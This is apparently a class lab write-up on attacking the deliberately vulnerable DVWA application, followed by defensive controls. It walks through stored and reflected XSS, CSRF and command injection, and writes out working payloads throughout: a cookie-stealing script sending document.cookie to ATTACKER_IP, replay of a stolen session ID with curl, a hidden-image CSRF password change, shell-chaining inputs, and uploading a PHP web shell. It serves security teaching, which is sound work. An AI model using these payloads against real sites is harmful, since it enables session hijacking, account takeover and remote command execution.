# Web exploitation using DVWA

## XSS, session hijacking, CSRF, command injection and file upload 

Using **DVWA (Damn Vulnerable Web App)** on:

* `http://192.168.0.101/dvwa/`
* Security level: **low**
* User is logged in (so we have a valid `PHPSESSID` cookie).

---


## Example steps / payloads

### 0. Environment setup

1. Log into DVWA as a normal user.
2. Set security level to **Low** (*DVWA Security* menu).

---

### 1. Stored XSS - Stealing session cookies

**Page:** DVWA; *XSS (Stored)*

1. In the “Message” / comment input, inject:

   ```html
   <script>
   alert("This is a message from a hacker. Your cookie is " + document.cookie)
   </script>
   ```

2. Submit the message so it gets stored in the DB.

3. Any user who visits the page now sees a popup:

   ```text
   This is a message from a hacker. Your cookie is security=low; PHPSESSID=a61eef8e040077ca2e4a3551f5fa4aec
   ```

This shows:

* JavaScript is running **inside the DVWA origin** (`http://192.168.0.101`).
* It can access `document.cookie` for that origin, which includes the **session ID**.

#### Turning this into session hijacking

Instead of just `alert`, a real attacker would exfiltrate the cookie to their own server, for something like this:

```html
<script>
  new Image().src="http://ATTACKER_IP/log.php?c="+encodeURIComponent(document.cookie);
</script>
```

If the victim is logged in and loads that page, the attackers server receives:

```text
c=security=low; PHPSESSID=a61eef8e040077ca2e4a3551f5fa4aec
```

Now the attacker can use that cookie to impersonate the victim, for example:

```bash
curl -H "Cookie: security=low; PHPSESSID=a61eef8e040077ca2e4a3551f5fa4aec" "http://192.168.0.101/dvwa/index.php"
```

Or:

* Open a browser in a separate profile / incognito.
* Manually set the `PHPSESSID` cookie to the stolen value.
* This would allow logging in as the victim.

---

### 2. Reflected XSS

**Page:** DVWA. *XSS (Reflected)*

Here the application reflects back what is send.

1. In the text field, enter the same payload:

   ```html
   <script>
   alert("This is a message from a hacker. Your cookie is " + document.cookie)
   </script>
   ```

2. Submit it, and then we can see the same popup reading your cookie.

This shows:

* The data does not have to be stored in the DB (like stored XSS).
* Even one malicious link (`?q=<script>...</script>`) is enough to execute attacker JS in the DVWA origin.

---

### 3. Same Origin Policy and why XSS breaks it

**Same Origin Policy** says:

* JavaScript running on `http://192.168.0.101` can freely access `document.cookie`, DOM, and make requests *only* to that origin.
* It cannot directly read responses from **other domains** (like `http://attacker.com`) due to this policy.

In the other hand:

* When we inject `<script> (someting here) </script>` into DVWA, the browser treats it as **trusted code from DVWA**.
* That script then runs with **full privileges of the DVWA origin**, so it can:

  * Read `document.cookie`.
  * Issue authenticated requests to DVWA (because cookies are attached automatically).
* Thats why XSS is so powerful, because it can effectively **turns the victims browser into a remote control** for that site.

---

### 4. CSRF: Changing a DVWA password without the user noticing

**Page:** DVWA, *CSRF* (password change functionality)

As example we build external HTML page that triggers a **GET** request to DVWAs CSRF endpoint with new password parameters.

#### 4.1 Create a malicious CSRF page

On attacker machine:

```bash
nano csrf.html
```

Paste:

```html
<html>
  <body>
    <h1>This is a CSRF test</h1>
    <img src="http://192.168.0.101/dvwa/vulnerabilities/csrf/?password_new=test2&password_conf=test2&Change=Change#">
  </body>
</html>
```

Explanation:

* When this HTML is loaded by the victims browser,
* The `<img>` tag causes an HTTP GET request to DVWAs CSRF page with parameters:

  * `password_new=test2`
  * `password_conf=test2`
  * `Change=Change`
* If DVWA accepts GET requests and doesn’t require a CSRF token, it will **change the users password** to `test2` without any confirmation.

#### 4.2 Host the page with a simple HTTP server

From the directory where `csrf.html` lives:

```bash
python -m http.server 8000
```

Now the page is available at:

```text
http://localhost:8000/csrf.html
```

(or `http://ATTACKER_IP:8000/csrf.html` if remote).

#### 4.3 Trigger the attack as a logged in DVWA user

1. Ensure the victim is **logged into DVWA** in their browser.

2. Victim visits:

   ```text
   http://localhost:8000/csrf.html
   ```

3. The browser loads the `<img>` and then silently sends a GET request to DVWA with its **existing cookies** (including `PHPSESSID`).

4. DVWA receives a valid authenticated request and changes the password to `test2`.

Result: The user never clicked a button, but password is changed.

---

### 5. Command injection; chaining shell commands

**Page:** DVWA; *Command Injection*

Theres a field like **“Enter an IP address”**, which the backend uses in a command such as:

```bash
ping -c 4 <user_input>
```

If the app doesnt sanitize input, you can chain commands with `;`.

#### 5.1 Test normal behaviour

Enter:

```text
127.0.0.1
```

You will see ping output, that the machine is reachable.

#### 5.2 Inject a second command

Enter:

```text
; ls -la
```

or a combination:

```text
127.0.0.1; ls -la
```

If vulnerable, the output will show directory listing after ping output (or only `ls` output if ping fails).

Why this works:

* The shell executes something like:

  ```bash
  ping -c 4 ; ls -la
  ```

* `;` ends the `ping` command and starts `ls -la`.

From here, you can run many OS commands like:

* `; whoami`
* `; id`
* `; netstat -an`

This is **Remote Command Execution (RCE)** via just a simple injection.

---

### 6. File upload vulnerability; uploading HTML/XSS or a web shell

**Page:** DVWA; *File Upload*

On low security, DVWA often:

* Does weak or no validation on file type.
* Stores uploaded file in a web accessible directory.

This lets you upload:

1. **An HTML file with stored XSS:**

   Example HTML:

   ```html
   <html>
   <body>
     <h1>Hi!</h1>
     <script>
       alert("XSS from uploaded file: " + document.cookie);
     </script>
   </body>
   </html>
   ```

   * Save as `xss.html`.
   * Upload via DVWAs upload form.
   * DVWA gives you a link ( `../../uploads/xss.html`).
   * When any user visits that URL on the same origin, the XSS executes and can again steal cookies.

2. **A web shell (from ajaxshell)**

   For class we download:

   * `https://sourceforge.net/projects/ajaxshell`

   * Upload the PHP shell via the File Upload functionality.

   * Browse to it:

     ```text
     http://192.168.0.101/dvwa/hackable/uploads/ajaxshell.php
     ```

   * If successfully interpreted by the server, you now have a **web-based shell** with which you can run commands on the server via HTTP or many other examples or commands that can result in anything that the attacker would construct.


---

## Analysis / Notes

* **Stored XSS** is especially dangerous because:

  * Every visitor to the page runs the malicious script.
  * Its persistent, because it survives page reloads and even server restarts until removed.
* **Reflected XSS** is often delivered via malicious links in emails/chats but still powerful for attacks.
* **Session hijacking and Same-Origin Policy:**

  * The policty is supposed to protect cookies and DOM data.
  * XSS works by tricking the browser into running attacker code *as if it came from the trusted origin*, completely bypassing that protection.
* **CSRF**:

  * The attacker doesnt need to steal your cookie.
  * They just need to cause your browser (already logged in) to send a request they want, because cookies are attached automatically.
* **Command injection** and **file upload** vulnerabilities:

  * Turn a web attacker into a system attacker.
  * Command injection gives direct OS level command execution.
  * File upload with arbitrary code (like web shells) effectively gives persistent remote access via HTTP.

From a **defensive** perspective, this covers a lot of critical controls:

* Output encoding and input validation to prevent XSS.
* `HttpOnly` cookies to at least stop `document.cookie` theft.
* CSRF tokens (synchronizer tokens / double-submit cookies) and POST-only for sensitive actions.
* Avoid `system()` / `exec()` with unsanitized user input and use safe APIs instead.
* Strict file upload validation and storing uploads outside webroot.
* Principle of least privilege so that even if the web app is compromised, system impact is limited.

